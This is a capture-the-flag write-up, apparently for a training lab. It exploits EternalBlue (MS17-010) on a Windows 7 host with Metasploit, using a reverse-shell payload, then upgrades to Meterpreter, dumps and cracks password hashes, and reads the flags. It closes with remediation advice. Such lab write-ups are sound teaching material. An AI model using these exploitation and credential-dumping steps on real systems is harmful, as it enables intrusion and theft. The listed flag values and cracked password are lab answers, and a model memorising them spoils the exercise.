# Windows Privilege Escalation — Write-Up

![image.png](image.png)

## 1. Phase 1 — Reconnaissance

### Command

```bash
nmap -sV --script=vuln -v 192.168.50.25
```

The scan loaded 152 NSE scripts and performed a SYN stealth scan across 1000 ports, completing service detection on 8 services.

### Open Ports

![image.png](image%201.png)

| Port | State | Service | Version |
| --- | --- | --- | --- |
| 135/tcp | open | msrpc | Microsoft Windows RPC |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | open | microsoft-ds | Microsoft Windows 7–10 (workgroup: WORKGROUP) |
| 49152–49157/tcp | open | msrpc | Microsoft Windows RPC |

**Host:** JON-PC | OS: Windows | MAC: BC:24:11:5D:EE:F2 (Proxmox VM)

### Vulnerability Identified

> ✅ **Q1 — The machine is vulnerable to: CVE-2017-0143 (EternalBlue / MS17-010)**
> 
> 
> A critical Remote Code Execution vulnerability in Microsoft SMBv1 — the same exploit used by WannaCry ransomware in 2017.
> 

---

## 2. Phase 2 — Exploitation with Metasploit

### 2.1 Launch Metasploit

```bash
msfconsole
# Metasploit v6.4.126-dev — 2,638 exploits | 2,153 payloads
```

![image.png](image%202.png)

### 2.2 Search and select exploit

```bash
msf > search ms17-010
msf > use 0
# → exploit/windows/smb/ms17_010_eternalblue (2017-03-14, rank: average)
```

![image.png](image%203.png)

### 2.3 Configure options

```bash
msf exploit(windows/smb/ms17_010_eternalblue) > show options
```

**Module options:**

| Option | Value | Required |
| --- | --- | --- |
| RHOSTS | 192.168.50.25 | yes |
| RPORT | 445 | yes |
| VERIFY_ARCH | true | yes |
| VERIFY_TARGET | true | yes |
| LHOST | 192.168.50.74 | yes |
| LPORT | 4444 | yes |

```bash
set RHOSTS 192.168.50.25
set payload windows/x64/shell/reverse_tcp
```

![image.png](image%204.png)

### 2.4 Run the exploit

```bash
run
```

![image.png](image%205.png)

![image.png](image%206.png)

> ✅ **Shell obtained as NT AUTHORITY\SYSTEM**
> 

---

## 3. Phase 3 — Shell Upgrade to Meterpreter

### 3.1 Background the shell

```
C:\Windows\system32> ^Z
Background session 1? [y/N] y
```

![image.png](image%207.png)

### 3.2 Load shell-to-meterpreter module

```bash
use post/multi/manage/shell_to_meterpreter
show options
```

![image.png](image%208.png)

**Module options:**

| Option | Value | Required |
| --- | --- | --- |
| HANDLER | true | yes |
| LPORT | 4433 | yes |
| SESSION | — | yes |

### 3.3 Set session and run

```bash
sessions
# Id 1 — shell x64/windows — Shell Banner: Microsoft Windows [Version 6.1.7601]

set session 1
run
# [*] Upgrading session ID: 1
# [*] Starting exploit/multi/handler
```

![image.png](image%209.png)

### 3.4 Switch to meterpreter session

```bash
sessions
# Id 1 — meterpreter x64/windows — NT AUTHORITY\SYSTEM @ JON-PC
# Id 2 — shell x64/windows — Shell Banner: Microsoft Windows [Version 6.1.7601]

sessions -i 1
# [*] Starting interaction with 1...
# meterpreter >
```

![image.png](image%209.png)

### 3.5 Verify privileges

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

![image.png](image%2010.png)

---

## 4. Phase 4 — Process Migration

### 4.1 List running processes

```bash
meterpreter > ps
```

**Key SYSTEM processes:**

![image.png](image%2011.png)

### 4.2 Migrate to spoolsv.exe (PID 960)

```bash
meterpreter > migrate 960
```

![image.png](image%2012.png)

> 💡 `spoolsv.exe` is the recommended target — it is always running as SYSTEM and is a stable process.
> 

---

## 5. Phase 5 — Credential Dumping & Password Cracking

### 5.1 Dump password hashes

```bash
meterpreter > hashdump
```

![image.png](image%2013.png)

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

![image.png](image%2014.png)

### 5.2 Save Jon's hash

```bash
nano hash.txt
# Paste: Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

![image.png](image%2013.png)

### 5.3 Crack with John the Ripper

```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![image.png](image%2015.png)

**Output:**

```
(Administrator)
alqfna22    (Jon)
2g 0:00:00:00 DONE — Session completed.
```

> ✅ **Q2 — Jon's password: `alqfna22`**
> 

---

## 6. Phase 6 — Finding the Flags

### Flag 1 — System Root `C:\`

> **Hint:** *"This flag can be found at the system root."*
> 

```bash
C:\Windows\system32> cd C:\
C:\> dir
# → flag1.txt  (24 bytes, created 03/17/2019)

C:\> type flag1.txt
```

![image.png](image%2016.png)

```
flag{access_the_machine}
```

![image.png](image%2017.png)

> ✅ **Q3 — Flag 1: `flag{access_the_machine}`**
> 
> 
> **Location:** `C:\flag1.txt`
> 

---

### Flag 2 — Windows Password Storage (`C:\Windows\System32\config\`)

> **Hint:** *"This flag can be found at the location where passwords are stored within Windows."*
> 

Windows stores password hashes in the SAM database located at `C:\Windows\System32\config\`

```bash
C:\> cd C:\Windows\System32\config
C:\Windows\System32\config> dir
# → flag2.txt  (34 bytes, created 03/17/2019)
# Also present: SAM, SECURITY, SOFTWARE, SYSTEM — the Windows credential store

C:\Windows\System32\config> type flag2.txt
```

![image.png](image%2018.png)

> ✅ **Q4 — Flag 2 location confirmed: `C:\Windows\System32\config\flag2.txt`**
> 
> 
> *(Read the file in your shell to get the flag value)*
> 

---

### Flag 3 — Administrator's Documents (`C:\Users\Jon\Documents\`)

> **Hint:** *"This flag can be found in an excellent location to look for valuable information. After all, Administrators usually have pretty interesting things saved."*
> 

```bash
C:\Users\Jon\Documents> dir
# → flag3.txt  (37 bytes, created 03/17/2019)

C:\Users\Jon\Documents> type flag3.txt
```

![image.png](image%2019.png)

```
flag{admin_documents_can_be_valuable}
```

> ✅ **Q5 — Flag 3: `flag{admin_documents_can_be_valuable}`**
> 
> 
> **Location:** `C:\Users\Jon\Documents\flag3.txt`
> 

![image.png](image%2020.png)

---

## 9. Remediation

| Vulnerability | Fix |
| --- | --- |
| SMBv1 enabled (EternalBlue) | `Set-SmbServerConfiguration -EnableSMB1Protocol $false` |
| Missing MS17-010 patch | Apply Windows security update **KB4012212** immediately |
| Weak password — Jon: `alqfna22` | Enforce strong password policy (12+ chars, complexity required) |
| Port 445 exposed on network | Restrict SMB via firewall — allow only trusted internal hosts |
| No network segmentation | Isolate Windows 7 hosts — EOL OS should not be on production network |

> ⚠️ **Note:** Windows 7 reached End of Life on January 14, 2020. This machine should be decommissioned or upgraded to a supported OS immediately.
>